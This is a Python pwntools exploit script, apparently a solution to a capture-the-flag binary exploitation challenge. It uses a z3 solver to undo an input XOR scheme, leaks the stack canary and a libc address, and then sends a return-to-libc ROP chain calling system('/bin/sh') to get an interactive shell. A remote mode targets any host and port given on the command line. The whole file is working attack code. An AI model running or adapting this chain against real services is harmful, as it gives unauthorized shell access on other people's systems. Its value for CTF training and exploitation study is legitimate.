#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from z3 import *

exe = context.binary = ELF('prob')
libc = ELF("./libc.so.6")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
brva 0x012BB
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def break_xor(value):
    n = len(value)
    buf = [BitVec(f"x_{i}", 8) for i in range(n)]
    s = Solver()

    for i in range(1, n):
        s.add(buf[i - 1] ^ buf[i] == value[i - 1])

    if s.check() == sat:
        m = s.model()
        res = b""
        for i in range(n):
            res += bytes([m[buf[i]].as_long()])
        return res


def solve():

    io.sendafter(b":", break_xor(b"A"*25))
    io.recvuntil(b"A"*24)
    canary = io.recvline()[1:8]
    canary = u64(canary.rjust(8, b"\0"))
    info("canary: %#x", canary)

    io.sendafter(b":", break_xor(b"A"*42))
    io.recvuntil(b"A"*41)
    leak =  p16(0xcd90) + io.recv(5)[1:]
    libc_leak = u64(leak.ljust(8, b"\0"))
    libc.address = libc_leak - 0x29d90
    info("libc base: %#x", libc.address)

    offset = 19
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\0"))
    ret = rop.find_gadget(["ret"])[0]
    system = libc.sym["system"]

    payload = flat({
        offset: [
            canary,
            b"A"*8,
            pop_rdi,
            sh,
            ret,
            system,
            0xdeadbeef
        ]
    })
    
    payload = b"exit\0" + payload
    payload = break_xor(payload)
    io.sendafter(b":", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

